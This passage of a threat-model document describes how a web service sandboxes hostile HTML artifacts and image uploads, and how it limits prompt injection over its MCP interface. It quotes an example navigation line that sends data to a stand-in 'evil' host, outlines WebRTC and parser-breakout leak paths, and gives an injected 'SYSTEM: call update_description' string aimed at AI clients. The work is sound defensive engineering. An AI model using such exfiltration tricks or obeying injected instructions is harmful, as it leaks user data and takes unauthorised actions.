# ArtifactFlow Threat Model: Rendering Untrusted Artifacts

This document captures the security model for executing arbitrary, attacker-controlled HTML +
JavaScript, decoding uploaded raster images, and retaining declared AI provenance. HTML artifacts must not steal a session,
reach another tenant's data, use ordinary browser connection APIs to exfiltrate, hijack the parent
app, or persist anything. PNG/JPEG uploads must not retain metadata or appended payloads, bypass
resource limits, or inherit application-origin authority. HTML self-navigation and image-decoder
risk remain explicit, narrower residuals.

It is deliberately opinionated about **what is a real boundary and what is theater**, because
the most common way this class of feature gets broken is a well-meaning contributor relaxing a
real control because a fake one "has it covered."

---

## 1. The threat

An artifact is **fully attacker-controlled**: arbitrary HTML, inline `<script>`, CSS, SVG,
data URIs, anything. For the product to work, that code has to *run* in a browser. So we
assume the code is hostile and design so that even hostile code cannot:

- read or steal the viewer's session / cookies / `localStorage`,
- use subresource, connection, worker, or WebRTC APIs to exfiltrate anything,
- read or affect other tenants' data,
- navigate, frame, or clickjack the **main application** the user is logged into,
- persist state or escape its execution context.

We do **not** try to stop the artifact from misbehaving *within its own sealed box*
(see §8); that's neither possible nor necessary once the box is sealed.

---

## 2. Real boundaries vs. theater

There are exactly **three** load-bearing controls. Everything else is convenience.

| Control | Enforced by | Load-bearing? |
|---|---|---|
| **Separate artifact origin** (distinct host from the app) | Browser same-origin policy | ✅ Yes: the foundation |
| **iframe `sandbox="allow-scripts"`** (NO `allow-same-origin`) → opaque origin | Browser | ✅ Yes, but only while *embedded* |
| **CSP via HTTP response header** (incl. `sandbox` directive, `default-src 'none'`, `connect-src 'none'`, `frame-src`, `fenced-frame-src`, and `child-src 'none'`, `form-action 'none'`, `frame-ancestors`) | Browser | ✅ Yes: the **only** thing that survives top-level/full-screen for the directives browsers enforce. The emitted `webrtc 'block'` is not counted: Chromium and WebKit ignore it. |
| Injected JS guard (`ArtifactPreviewDocumentGuard`) monkeypatching `fetch`/`console`/storage/`open`/etc. | In-page JS | ❌ **No: cosmetic / defense-in-depth only** |
| The `csp=` attribute on `<iframe>` | (not reliably supported) | ❌ **No: do not rely on it** |

**Why the JS guard is theater (and why we keep it anyway):** it runs in the *same realm* as the
hostile code, so it is bypassable by construction (fresh references from a child context,
re-defining patched properties, using the setter you didn't patch). Its legitimate value is
*ergonomics*: it softens the browser sandbox's hard `SecurityError`s (e.g. `localStorage`
access in an opaque origin) into quiet no-ops so naive artifacts degrade gracefully instead of
blanking, and it suppresses console noise. **It is never a security control. Never weaken the
sandbox or CSP because the guard "handles" something.**

**Nested browsing contexts are unsupported.** Chromium can create an inline `srcdoc` or initial
`about:blank` child realm under `frame-src 'none'` in every maintained browser; that fresh realm also
bypasses every API patch installed in its parent. Chromium and WebKit ignore the non-standard
`webrtc 'block'` directive, so such a child can emit WebRTC STUN unless it is removed before its
script runs. The timing-independent response hardener therefore tokenizes and neutralizes static
`iframe`, `frame`, `fencedframe`, and `portal` tags before parsing. The early guard additionally
blocks dynamic element creation and the common HTML parsing/setter APIs; its MutationObserver
removes residual contexts but is too late to count as the primary control. This is regression-tested
with fifteen recursive `srcdoc` levels, foreign-content parser breakouts (including SVG/MathML
`plaintext`, SVG `script`, and scripting-enabled HTML `noscript` states), HTML `select`/`frameset`
tree-builder and raw-text-carrier breakouts, Firefox foreign-CDATA integration-point behavior, the
maintained Chromium/WebKit bogus-comment interpretation of the same CDATA bytes, open and closed
declarative shadow roots, response-body template assertions, and a real UDP STUN listener. Static
`shadowrootmode` attributes are renamed before parsing because a residual light-DOM observer cannot
inspect a materialized closed shadow tree. These measures close the maintained attack corpus but
remain layered compatibility hardening, not a reason to weaken the three load-bearing controls
above.

The response rewriter is intentionally treated as a partial, hand-maintained model of HTML
tokenization and tree construction, not as a proven parser implementation. Known-case regressions
alone cannot establish completeness. The CI browser corpus therefore generates a bounded seeded
set of tokenizer/tree-builder combinations, runs each through the exact PHP string rewriter without
the injected runtime JavaScript guard, and requires `window.frames.length === 0` after parsing in
Chromium, Firefox, and WebKit. Raw inputs are parsed too so the run records how many generated cases
actually materialize a child context. CI derives a reproducible seed from the commit SHA and failure
output includes the exact seed, case index, and payload.

The measured foreign-content rewriter defects were not isolation bypasses. A synthetic `srcdoc`
child sent STUN binding requests from Chromium and WebKit when response rewriting was absent, and
later parser-state differentials combined with declarative Shadow DOM reproduced that bounded
behavior through the real vulnerable stack. Those packets disclosed that the test page was open at
the collector-facing IP and time, but carried no artifact payload. The corrected stack neutralizes
the parser differentials and shadow-root attributes before parse, creates no surviving child, and
emits zero UDP in the maintained regression. Origin isolation, opaque sandboxing, authorization,
and signed-preview boundaries remained intact throughout. There is no page-level policy that can
reliably disable a data-channel-only peer connection in an unreachable child realm, so the
application control is to prevent that realm from existing before parse, not to credit `webrtc
'block'`, Permissions Policy, or the iframe `allow` attribute with protection they do not provide.
Deployment-level network egress policy is a separate operator choice.

**Speculative resource hints are unsupported.** `prefetch`/`prerender` fetches are covered by the
header CSP, but browser behavior for `dns-prefetch` and `preconnect` is not governed consistently
by `connect-src`. The server rewriter removes static resource hints and refresh metas, every
artifact response sends `X-DNS-Prefetch-Control: off`, and the early guard synchronously
neutralizes later `rel`/`href` and `http-equiv`/`content` mutations through attribute methods,
IDL accessors, attribute nodes, and `relList` before calling a native DOM sink. Guard wrappers
coerce attacker-controlled WebIDL strings exactly once, validate that primitive, and pass only
the primitive to the native sink; native code never receives the original coercible object. The
mutation observer is only a residual fallback; it is too late to stop a mutation that itself
initiates DNS or TCP work. Origin isolation remains the load-bearing limit on what the artifact
can read.

Implemented in: `app/Http/Support/ArtifactSandboxResponder.php` (shared header CSP + `securityHeaders()`),
`app/Http/Controllers/ArtifactPreviewController.php` and `ArtifactDraftPreviewController.php` (delegate saved and draft responses to the shared responder),
`app/Application/PageCatalog/ArtifactPreviewDocumentGuard.php` (the guard),
`resources/views/pages/show.blade.php` and `resources/views/pages/versions/show.blade.php` (embedding iframes: current and historical version).

**Keeping artifacts embedded.** The iframe `sandbox` protects only while the artifact is *embedded*. So the artifact host serves artifact HTML only to iframe embeds (`Sec-Fetch-Dest: iframe`, a browser-set header page script cannot forge) and refuses top-level document loads. This stops an artifact from being opened as its own page, where the sandbox attribute would no longer apply and downloads, self-initiated fullscreen/pointer-lock, and same-origin storage on the shared artifact host would return. On the **saved** artifact path an absent `Sec-Fetch-Dest` (legacy client, or a proxy that strips it) fails open so embedding keeps working — the only residual is a non-modern browser, which lacks the sandbox protections regardless, and the header CSP `sandbox` directive still forces an opaque origin. The **draft** receiver (§5) is stricter: it requires a valid content-bound capability and fails *closed* unless `Sec-Fetch-Dest: iframe` is explicitly present. The preview controllers enforce this through `ArtifactSandboxResponder`.

**Known residual: navigation-based exfiltration.** A sandboxed frame can always navigate *itself* (only *top* navigation needs `allow-top-navigation`), and no shipped CSP directive blocks it (`navigate-to` was dropped). So `location = 'https://evil/?data'` cannot be fully prevented while artifacts run scripts. It is bounded by the isolated origin (no cookies/session/other-tenant data to steal), so the only exposure is data a user is socially engineered into entering, the viewer's IP, and view confirmation. Mitigated by user-facing "untrusted artifact" framing, not by a header.

---

## 3. How CSP must be delivered (the subtle part)

Delivery mechanism matters as much as the policy:

- **HTTP `Content-Security-Policy` header: strongest.** It travels *with* the document into
  any context (embedded *or* top-level), and it is the **only** place the `sandbox` and
  `frame-ancestors` directives actually work. Served artifacts MUST use this.
- **`<meta http-equiv="Content-Security-Policy">`: partial — and no longer used.** A meta CSP
  can carry resource directives but **cannot** carry `sandbox` or `frame-ancestors` (those are
  header-only and silently ignored in `<meta>`). ArtifactFlow ships **no `srcdoc`/`<meta>`-CSP
  surface**: both saved and pre‑save draft previews are served from the artifact origin with a
  header CSP. Retained here only as general browser guidance.
- **The `csp=` iframe attribute: do not use.** "CSP Embedded Enforcement" is not reliably
  supported across browsers (Firefox/Safari don't honor it; Chromium gates it on the embeddee
  opting in). Treat it as a no-op and never depend on it.

---

## 4. The full-screen / top-level trap ⚠️

This is the easiest way to silently void all the protection.

The iframe `sandbox` **attribute** is set by the parent and **only exists while the document is
a child frame.** The moment an artifact becomes a **top-level document** (true full-screen via
navigation, "open in new tab," or pasting the signed URL into the address bar), there is no
iframe, so the attribute is **gone**. In that context the *only* surviving protections are:

1. the **CSP `sandbox` directive carried in the served response's HTTP header**, and
2. the **separate origin**.

Rules that follow:

- ✅ **Preferred full-screen = CSS-maximize the existing sandboxed iframe.** It stays sandboxed.
- ✅ Defense-in-depth for the top-level case: the served artifact response sends
  `Content-Security-Policy: sandbox allow-scripts; …` as a **header**, so even a top-level
  document would be browser-sandboxed. On top of that, `ArtifactPreviewController` now
  **refuses explicit non-iframe loads with 403** (`Sec-Fetch-Dest` check, see §2), so
  "open in new tab"/pasted signed URLs don't render at all on modern browsers; the header
  CSP remains the safety net when `Sec-Fetch-Dest` is absent.
- ☠️ **NEVER** render artifact content as a `blob:` or `data:` URL on the **main app origin.**
  A `blob:` URL **inherits the creating origin** → that is full XSS on the application origin.
- **Residual (accepted):** a *true* top-level sandboxed document can still navigate its **own
  tab** (`location.href = …`). Nothing leaks (opaque origin, `connect-src 'none'`), but it could
  bounce the user to a look-alike page: phishing-flavored, low severity. The maximized-iframe
  approach avoids even this. A full-screen link that does a real top-level navigation was removed
  for this reason; if it returns, it must point at the header-sandboxed URL, never a blob/data on
  the app origin.

---

## 5. Draft preview (runs on the ARTIFACT origin, like a saved artifact)

The pre-save draft preview (`resources/js/html-draft-preview.js`,
`resources/views/pages/create.blade.php`) renders unsaved HTML **on the isolated artifact
origin**, using the exact same hardened sandbox response as a saved artifact
(`ArtifactSandboxResponder`). First, the create page hashes the exact UTF-8 draft bytes and asks
the authenticated app endpoint (`POST /pages/draft-preview-capabilities`) for permission. That
CSRF-protected endpoint enforces live Editor-or-Admin page-creation authority in the selected
workspace and a per-user rate limit, then returns an HMAC-signed capability valid for at most 60
seconds. The signed payload binds capability-schema version, purpose, configured artifact origin,
workspace UID, expiry, a random nonce, exact byte length, and SHA-256; the raw HTML is not sent to
this app endpoint.

The create page then submits the draft and capability via a cross-origin **form POST into the
sandbox iframe** (`POST /artifact-previews/draft`,
`app/Http/Controllers/ArtifactDraftPreviewController.php`). The cookieless artifact runtime
verifies the HMAC, origin, purpose, canonical claims, expiry, exact length, and SHA-256 before it
reflects any bytes. The browser loads the response as a document on the artifact origin, so it
does **not** run on the cookie-bearing main origin and does **not** inherit the main app CSP.

It deliberately does **not** use a `srcdoc` iframe on the main origin: `srcdoc` inherits the
embedding page's CSP (`style-src 'self' 'nonce-…'`, no `unsafe-inline`), which silently dropped
the artifact's inline styles and forced a fragile app-nonce-reuse hack for scripts. Rendering on
the artifact origin gives the draft the same permissive, self-contained sandbox CSP as a saved
artifact, so the preview is a true match.

It is safe **only** because:

- capability issuance is authenticated, CSRF-protected, workspace-authorized, rate-limited,
  short-lived, content-bound, and fails closed; malformed, expired, or mismatched capabilities
  receive the same 404 without logging attacker-controlled content or token material,
- the artifact endpoint is **stateless and never persists** — after capability verification it
  echoes the posted HTML back hardened,
- the response carries the artifact sandbox CSP (`default-src 'none'; sandbox allow-scripts;
  connect-src 'none'; …`) plus `frame-ancestors <app-origin>`, so the reflected document has an
  **opaque origin** with ordinary subresource/connection APIs blocked, no storage, and no
  same-origin access; nested browsing contexts are removed to close the demonstrated fresh-realm
  WebRTC path, and
- the iframe keeps `sandbox="allow-scripts"` **without `allow-same-origin`** as defense in depth,
  and the endpoint refuses top-level (`Sec-Fetch-Dest` ≠ `iframe`) navigation.

**Invariants:** capability issuance MUST remain on the authenticated app origin, enforce live
page-creation authority, and bind the configured artifact origin plus exact draft bytes. The
artifact receiver MUST stay session-free and non-persisting; the response MUST keep the artifact
sandbox CSP; the iframe MUST keep `sandbox` without `allow-same-origin`. The app CSP's
`form-action` allows only `'self'` and the artifact origin so this cross-origin POST succeeds — do
not widen it further. Capabilities are short-lived bearer tokens: replay of the same exact draft
within their TTL is intentionally harmless, while use for another origin or content fails.
Regression-pinned in `tests/e2e/editor.spec.ts` (real authenticated issuance, inline styles,
isolation) and `tests/Feature/PageCatalog/ArtifactDraftPreviewHttpTest.php`.

---

## 6. Signed-URL access model

Served artifacts are gated by a signed URL (`app/Application/PageCatalog/ArtifactPreviewUrl.php`):
HMAC-SHA256 over `origin | pageUid | versionUid | expiresAt | accessRevision`, short TTL,
**fail-closed** signing key (`ARTIFACT_URL_SIGNING_KEY`; throws if unset; must be distinct from
`APP_KEY`).

Properties to keep in mind (these are intentional, but contributors must not be surprised):

- The URL is a **bearer token**, *not* bound to a user. Anyone holding it can view within the TTL.
- The signature binds the page's `preview_access_revision`, which is incremented by
  `PageAccessRevision` for grants, revocations, access-mode or ownership changes, archive,
  workspace moves, and membership/role changes that affect reach. Outstanding URLs are invalidated
  when one of those boundaries changes — the TTL only bounds the window in which *nothing
  changed*. Keep the TTL short anyway; it is the backstop.
- Invalid signatures return the same **404** as missing records
  (`ArtifactPreviewController`), so leaked page/version UIDs cannot be probed for existence.
- The signing key must be **high-entropy** and **distinct from `APP_KEY`** (the `.env.example`
  placeholder is not acceptable for production).
- The signature is computed over the **configured** origin, not the request `Host` → host-header
  spoofing cannot forge a valid signature. Do not change this to use the request host.

Expiry authorizes an HTTP load; it does not require the already-loaded document or the main
application window to refresh every minute. The app therefore has **no TTL reload timer**. A
prototype may deliberately reload its own iframe after the bearer URL has expired. Saved artifact
documents answer a per-load ready-signal handshake from their opaque origin (the parent posts a
nonce after each load; the document echoes that nonce back); when a later child load completes
without a matching acknowledgement, the authenticated parent may mint a fresh URL and replace
only that iframe's `src`. The recovery endpoint re-checks live page access, returns 404 to an
unauthorized caller, validates that the replacement URL targets the same artifact-origin path, and
never reloads the application document. This preserves unsaved editor state while retaining a short
bearer lifetime.

---

## 7. Known attack surface and tested abuse cases

This table is the maintained red-team inventory for artifact rendering. “Blocked” means the named
browser/server boundary rejects the demonstrated vector; it does not mean hostile in-page JavaScript
has somehow become trustworthy. Tests named here are regression evidence, not a substitute for
reviewing the browser standards and deployment configuration when a boundary changes.

| Vector exercised | Why the demonstrated attack fails | Residual / follow-up |
|---|---|---|
| Draft capability character flips, insertions, deletions, padding, extra segments, case changes, control bytes, oversized input, malformed base64/JSON | A bounded token grammar requires one base64url payload and one 64-nibble lowercase signature. HMAC verification happens before decoding or claim parsing; every single payload character and signature nibble mutation is rejected. | Fast grammar rejection and slower well-shaped HMAC rejection are distinguishable because token shape is attacker-controlled public input, not a secret. Keep rejection responses uniform and never log tokens. |
| HMAC mismatch position and signature-prefix guessing | Every well-shaped presented signature has the same length and is compared with PHP's `hash_equals`; the signature covers a domain-separated context plus the encoded payload. Deterministic tests mutate every signature nibble and reject every result. | Unit-test wall-clock ratios are too noisy to prove constant-time behavior and are deliberately not a release gate. Reassess with a dedicated statistical timing harness if the comparison primitive or threat boundary changes. |
| Correctly signed but reordered, missing, extra, wrongly typed, expired, future-dated, wrong-purpose, wrong-origin, malformed nonce/workspace/content claims | The verifier accepts exactly the version-1 ordered claim schema and exact scalar types/ranges. The configured artifact origin, purpose, maximum 60-second expiry, ULID shape, nonce, byte length, and lowercase SHA-256 are mandatory. | Producing these cases outside the test requires the signing key. The corpus still pins canonical verification against a future buggy or compromised issuer. |
| Capability replay with whitespace, newline, Unicode-normalization, encoding, or same-length content changes | Exact `strlen` and SHA-256 bind the posted byte sequence; visually equivalent content is intentionally different content. | Replaying the **same exact draft** on the configured artifact origin during the TTL is allowed. A workspace revocation after issuance does not revoke that already-issued, non-persisting capability; exposure is bounded to those already-authorized bytes and at most 60 seconds. |
| Capability moved to the app host, another artifact origin, or a proxy route that merges origins | The signed origin claim must equal configuration, and artifact runtime middleware requires the request's exact scheme/host/port to equal the configured artifact origin before routing. | A reverse proxy must preserve the real external scheme and host through the trusted-proxy configuration. Deployment doctor and origin-separation tests fail unsafe configurations. |
| Top-level navigation, new tabs, downloads, fullscreen, and pointer lock | Explicit non-iframe destinations are refused; draft requests fail closed without `Sec-Fetch-Dest: iframe`. The iframe has no popup/download/navigation/pointer-lock sandbox tokens, and the header CSP `sandbox` remains the top-level fallback. Product fullscreen only CSS-maximizes the existing iframe. | Saved previews deliberately tolerate an absent fetch-destination header for legacy embedding. Real Safari/macOS/iOS behavior remains a manual release check; see `docs/OPERATIONS.md`. Self-navigation of the frame remains the accepted §2 residual. |
| Static and dynamically created `iframe`, `frame`, `fencedframe`, or `portal`, including fifteen recursive `srcdoc` levels | Server hardening tokenizes actual tags into inert templates, escapes iframe raw text before moving it into a parsed template context, scans SVG/MathML elements whose children browsers parse as markup (including `plaintext` and SVG `script` breakouts), models scripting-enabled HTML `noscript` as raw text, and renames static `shadowrootmode` attributes before parsing. Genuine HTML script/textarea bytes remain opaque. CSP denies URL-backed child loads but does not stop inline `srcdoc`; the early guard blocks creation, insertion, parsing, markup-setter, streaming `document.write`, and XSLT materialization sinks, then observes residual light-DOM contexts. The maintained E2E corpus asserts foreign-content and declarative-shadow breakouts are inert in the served response and attempts real UDP STUN transmission through them. | Chromium and WebKit permit WebRTC from a fresh `srcdoc` realm despite the emitted `webrtc 'block'`. Static rewriting must happen before parse; the MutationObserver is a timing-dependent residual that cannot inspect closed shadow roots, not an acceptable first barrier. Never remove CSP, sandbox, or origin isolation because this regression passes. |
| `<object>`, `<embed>`, SVG `foreignObject`, workers, and HTML parsing/setter variants | `object-src 'none'`, `worker-src 'none'`, `default-src 'none'`, and nested-context directives block new executable/resource contexts. The runtime guard covers `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `setHTMLUnsafe`, `DOMParser`, `Range`, shadow roots, document write/parse APIs, and legacy `execCommand('insertHTML')`; the latter is disabled synchronously so an iframe cannot exist until the observer's next microtask. | Inline SVG/`foreignObject` may render inside the same sealed document; it gains no app-origin authority. Browser-specific parser additions require new regression cases when adopted. |
| Static or dynamically mutated `dns-prefetch`, `preconnect`, `prefetch`, `prerender`, and meta refresh | The server rewriter removes dangerous static markup. The artifact response opts out of DNS prefetching, while the early guard rejects dangerous insertion, parsing, property, attribute, attribute-node, and `relList` mutations before native setters run. Inspected WebIDL strings are frozen before validation and native dispatch. Tests insert benign elements first, then mutate them with primitive and statefully coercible values, and require synchronous neutralization plus no real TCP connection across Chromium, Firefox, and WebKit. | CSP covers actual prefetch/prerender fetches but not every DNS/TCP hint consistently. The observer remains a cleanup backstop only; it must never be the first control for network-initiating mutations. Self-navigation remains the accepted §2 residual. |
| Fetch/XHR/beacon/WebSocket/EventSource/WebTransport/WebRTC and fresh-realm network escape attempts | Header CSP denies ordinary connections and workers. The early guard stubs WebRTC in the top realm; response hardening removes static nested realms before their fresh constructors can run, and synchronous DOM-sink guards block dynamic construction. The E2E matrix includes a foreign-content nested-realm STUN payload, requires an inert template in the served response, and verifies zero UDP. | Chromium and WebKit ignore `webrtc 'block'`; it is retained only as best-effort hardening for engines that implement it. Navigation requests cannot be comprehensively blocked by shipped CSP, so origin isolation ensures the artifact has no session or cross-tenant data to exfiltrate; user-entered artifact data remains a social-engineering risk. |
| Parent/meta CSP conflicts, CSP header merging, and iframe-within-iframe inheritance | Artifact policy is an authoritative HTTP response header on the artifact response. Parent/meta policies cannot relax it, and application/artifact middleware overwrites security-critical headers rather than trusting an upstream weak value. | Reverse proxies must not replace the application-generated artifact CSP. Header presence and values should be checked during deployment and real-browser smoke tests. |
| Signed-URL expiry, grant/revoke/archive/workspace-move races, and revision replay | Saved preview signatures bind page, immutable version, expiry, artifact origin, and `preview_access_revision`; access-changing transactions increment the revision and the controller checks current state. Invalid/missing/stale targets share a 404. | An already-rendered document is not remotely erased when access changes. Renewal requires live access, and the short TTL plus revision closes future loads rather than pretending to revoke bytes already delivered to a browser. |
| Cookies, storage, and origin confusion | E2E proves artifact requests carry no application cookies. `sandbox` without `allow-same-origin` gives the document an opaque origin, and app/artifact hosts must remain distinct. Storage APIs are unavailable/no-op under the sealed context. | Browser extensions, compromised endpoints, and the viewer's device are outside this web-origin model. Do not place secrets inside artifact HTML merely because rendering is isolated. |

The deterministic capability corpus is
`tests/Feature/PageCatalog/ArtifactDraftPreviewCapabilitiesFuzzTest.php` and is exposed as
`make fuzz-capabilities`; the same file runs once inside the ordinary CI Pest suite. The generated
response-rewriter corpus lives in `tests/e2e/artifact-parser-differential-fuzz.spec.ts` and
`tests/e2e/support/artifact-parser-differential-corpus.php`. Browser attack cases live primarily in
`tests/e2e/editor.spec.ts`, `tests/e2e/saved-artifact-preview.spec.ts`,
`tests/e2e/artifact-cookie-isolation.spec.ts`, and `tests/e2e/mermaid-security.spec.ts`. The full
Playwright suite runs on Chromium; cases marked `@artifact-security` additionally run on Firefox
and WebKit. New browser-dependent artifact-boundary regressions must carry that tag.

## 8. Explicitly NOT defended (and that's fine)

- **The artifact navigating/reloading *itself*.** Can't be comprehensively prevented while running
  arbitrary JS. The opaque origin means it has no session, app storage, or other-tenant data, but
  self-navigation can still send artifact-controlled or user-entered data to a navigation endpoint;
  this is the accepted §2 social-engineering residual.
- **Artifacts being inert**: no ordinary connection/subresource APIs, no persistence, no workers,
  no popups, no console. This
  is a **product boundary, not a bug**: artifacts are self-contained, offline, isolated. Features
  that need network/storage are out of scope by design.
- **A revoked member's already-open presence socket, for the window until it drops.** Realtime
  presence is opt-in and off by default (`BROADCAST_CONNECTION=null`). Presence-channel
  authorization runs at subscribe time (`routes/channels.php` re-checks `PageAccess::canView`), and
  on any access change `PagePresenceRevoker` broadcasts `PagePresenceAccessRevoked` to kick affected
  clients. That kick is **client-cooperative**: Reverb exposes no server-initiated per-connection
  disconnect to application code, so a revoked member who ignores the event keeps their open
  subscription until the socket closes. During that window they can observe presence **identity
  metadata only** — `uid` and `name`, locked to exactly that shape by
  `ChannelAuthorizationConventionTest`. They **cannot** re-subscribe (auth now fails) and **cannot**
  read page content (content is always fetched over the authorized HTTP path, never carried on the
  presence channel). This is an accepted, bounded, metadata-only residual, not a content-exposure
  path.

---

## 9. Application authorization and taxonomy metadata

System Admin is an installation/account role, **not** a content superuser. It does not implicitly
enumerate or read personal workspaces, shared workspaces, pages, categories, tags, or signed preview
URLs. Content reach always requires normal workspace membership or an explicit page grant. The UI,
search, preview-renewal endpoint, realtime channel authorization, and MCP all delegate to the same
server-side access rules; hiding a link in Blade is never the boundary.

Registered human coworker identity is deliberately **not confidential metadata** inside one
installation. Any authenticated human account may be shown another human account's name, email, and
UID in coworker pickers, including System Admin accounts. Automation service accounts are excluded
from those human pickers. A UID is an identifier, never a capability: knowing, enumerating, or
submitting one must not bypass `can:invite`, `can:manageAccess`, role ceilings, locked-row
reauthorization, or any read-time workspace/page check. Direct Reader page grants may target any
registered human coworker; Editor/Admin page grants still require membership in the page workspace.
Adding a coworker directly to a workspace still requires invitation authority over that workspace.
External people who do not have an installation account are outside this directory and outside the
Alpha sharing model.

Workspace and taxonomy labels are potentially sensitive metadata:

- a workspace member may discover that workspace's categories, including categories not yet attached
  to a page, because categories are workspace-owned vocabulary;
- a page-only grant may expose the granted page's source workspace name and attached category/tag so
  the page can be found and filtered, but it must not enumerate sibling pages, unused source-workspace
  categories, or tags that occur only on inaccessible pages;
- tags use one installation-wide row per slug, but global storage does **not** make the vocabulary
  globally readable. Filter and MCP discovery return a tag only through a page the actor can view;
- cross-workspace category labels are qualified as `Category — Workspace` so identical category names
  do not collapse into a misleading filter; and
- coarse SQL visibility is always followed by the exact `PageAccess::canView` check. Token workspace
  scope can narrow this reach but never expand it.

Revoking a page grant removes that discovery path on the next authorized request. A grantee cannot
revoke their own grant unless they independently have page-access management authority; merely being
the grant subject, or a System Admin, does not confer that authority.

## 10. Raster image input and preview

PNG and JPEG uploads are hostile binary parser input. ArtifactFlow does not retain or directly serve
the uploaded container. The write boundary requires a valid upload, an extension matching the
header-detected format, a supported PNG/JPEG envelope, bounded compressed bytes, a bounded maximum
dimension, and a bounded total pixel count. The application performs only fixed-offset PNG header
inspection or a JPEG walk capped at 256 pre-frame markers and 1 MiB of header bytes; restart
markers before scan data are rejected. It does not invoke a native raster decoder.

The original bytes are sent to a dedicated `image-parser` container over an internal-only network.
Timestamped nonce-bearing requests and parser responses are HMAC authenticated with a dedicated
secret. The parser has no app source, database client or credentials, artifact-storage mount, public
port, or outbound network route. It runs as a non-root user with a read-only filesystem, no Linux
capabilities, `no-new-privileges`, a no-exec temporary filesystem, and CPU, memory, and process
limits. GD and EXIF exist in that image, not the production application image. The parser natively
decodes and re-encodes the image in the same format. The application disables response
decompression, rejects encoded responses, and incrementally reads at most the signed output-byte
budget plus one sentinel byte before closing the stream. It then verifies the signed response,
format, dimensions, limits, and envelope before storage. The upload cap bounds hostile input; a
separately signed output budget, bounded by the installation artifact limit, allows a safe
re-encoding to be larger than its compressed upload without letting app and parser limits drift.
Only that normalized result becomes the
immutable version payload; EXIF/GPS,
comments, profiles, malformed trailing data, and bytes appended after the image are discarded.
The shipped 512 MiB parser service deliberately uses one normalization process because a
maximum-pixel decode, EXIF rotation, and re-encode can consume substantial native memory.
Its startup script refuses `PHP_CLI_SERVER_WORKERS` values above one. New uploads have a fixed
16 Mi-pixel hard ceiling while retained normalized versions remain readable up to the historical
40 Mi-pixel envelope. Before dispatch, every app replica competes for one non-blocking lock in the
shared rate-limit cache; contention returns a retryable 503 instead of queueing an app worker
behind the serial parser. Every dispatched attempt consumes exact-pixel per-user and
installation-wide one-minute budgets; only a client failure proven to occur before dispatch is
refunded. A transport or response-stream failure whose parser state is uncertain keeps the shared
slot until its bounded lease expires. Budget rejection returns 429 for the user budget or retryable
503 for shared capacity.
Additional separately memory-bounded parser replicas therefore provide failover without silently
multiplying admitted native work; raising installation concurrency requires a deliberate,
benchmarked architecture change. If the sole parser process is killed, the container exits instead
of leaving a degraded worker pool behind a healthy listener. Production boot and doctor checks
reject a parser shared secret on artifact-host, worker, or scheduler roles. The parser image omits
optional WebP support, its authenticated request envelope admits only PNG/JPEG, and its health
endpoint performs a one-pixel PNG decode/re-encode rather than reporting listener liveness alone.

PNG receives an additional pre-decode work boundary inside the parser. Before GD is called, the
parser walks at most 4,096 CRC-valid chunks, requires one consecutive IDAT sequence, validates the
IHDR color-depth and palette rules, strips `zTXt`, `iTXt`, and `iCCP` metadata from the
bytes handed to GD, and inflates IDAT with an output ceiling of exactly the scanline bytes implied
by width, height, color type, bit depth, and Adam7 passes. A pixel stream that expands even one byte
beyond that envelope, ends early, or uses an invalid filter byte receives 422 before GD. The bounded
walker is deliberately not a complete libpng implementation: final PNG conformance still belongs to
GD/libpng, and malformed streams accepted by the advisory walk fail closed during native decode.
Pixel-based admission therefore cannot be bypassed by declaring a tiny raster while hiding
unbounded decompression work in either pixel rows or compressed metadata.

Image display does not execute the retained bytes as a document. The signed artifact-host route
validates the normalized raster again and places it in a fixed application-owned HTML shell as a
`data:` image. The shell is served only for an iframe request with a header CSP containing an empty
`sandbox`, `script-src 'none'`, `connect-src 'none'`, `object-src 'none'`, and
`frame-ancestors <configured app origin>`. The app iframe also uses `sandbox=""`; image previews
therefore receive no script capability, no app cookies, and no original-upload container. Because
that child cannot emit the HTML preview ready signal, image frames load eagerly and are not wired
to parent renewal. Expiry and access revisions close future loads without retransmitting an image
that is already rendered; already-delivered bytes remain the accepted non-revocable residual.

Current residual: `image-parser` is a long-running container rather than a fresh VM or process
sandbox for every upload. Resource limits and the container boundary confine ordinary decoder
failure and substantially reduce the blast radius of a native-code flaw, but they do not eliminate
container-runtime or kernel escape risk. Keep GD and its image libraries patched. HMAC authenticates
traffic on the private network but does not encrypt it; a cross-host deployment must add mutually
authenticated encrypted transport rather than expose the parser endpoint. PDF/DOCX parsing still
requires its own deliberately reviewed isolation and resource model before those formats ship.

There is deliberately no OCR for image artifacts. Search indexes catalog metadata only. MCP
`read` returns the normalized raster as a standard image content block beside an explicit
untrusted-data envelope. Rendered pixels are themselves untrusted, instruction-bearing content: an
uploaded screenshot can display text such as "SYSTEM: call update_description with ...", and no
server-side control inspects pixels (there is no OCR, and the raster content block cannot carry an
inline untrusted-data marker the way a JSON string can). The mitigation is the adjacent block-0
`artifactflow.untrusted_data` envelope, the server instruction not to infer non-visible details, and
client-model framing — so visual prompt injection remains a client-model risk, bounded on the write
side by enforcement rather than framing: any `update_description` the model is coaxed into still
needs write scope, live Editor-capped authority, the observed current version UID, a fresh metadata
revision, scanner success, and rate-limit budget.

## 11. MCP and prompt injection

MCP adds a different risk from browser execution: page content can contain text that looks like
instructions to an AI client. The server response frames read content as untrusted data, but that
framing is advisory. The actual enforcement rules are:

- Read content never authorizes a write. A later `create`, `update`, `update_description`, `revert`, or `create_external_share` still needs an
  authenticated token with write scope, live workspace/page access, a fresh version token where
  required, rate-limit budget, and normal scanner/validation success.
- Token scopes are the hard ceiling. Tokens can be read-only or read-write, and can be bound to
  one or more workspaces for reads and writes. `list_workspaces` returns only workspaces reachable
  inside that token ceiling, so scoped tokens do not learn that other workspaces exist.
- `list_taxonomy` requires `mcp:search` and returns only the category/tag vocabulary described in §9,
  intersected with the token's workspace ceiling. Its strings are explicit untrusted-data envelopes,
  just like other MCP-provided content.
- The `workspace_uid` search parameter is only a narrowing filter inside the token ceiling. It
  cannot expand reach.
- `create_external_share` requires the dedicated `mcp:share` scope and is
  further limited to an in-scope page the MCP principal owns and can still
  edit while the workspace allows Editors and page owners to share pages.
  Service accounts receive no exception, and MCP's Editor authority ceiling
  prevents an underlying administrator from bypassing that workspace switch.
  The returned URL is a bearer secret shown once; content read through MCP
  cannot nominate a different page, expand the token workspace ceiling, or
  authorize logging or retaining that URL.
- Inline script in an HTML artifact is expected. It is recorded as advisory scan metadata and
  audit context, not blocked for human acknowledgement. Isolation, not review, is the execution
  control.
- There is no per-page "AI-visible" approval gate. Page reach is ordinary access scoping plus
  token scoping, not human safety vetting.

Client-side instruction-origin discipline still matters: AI clients should trace writes to an
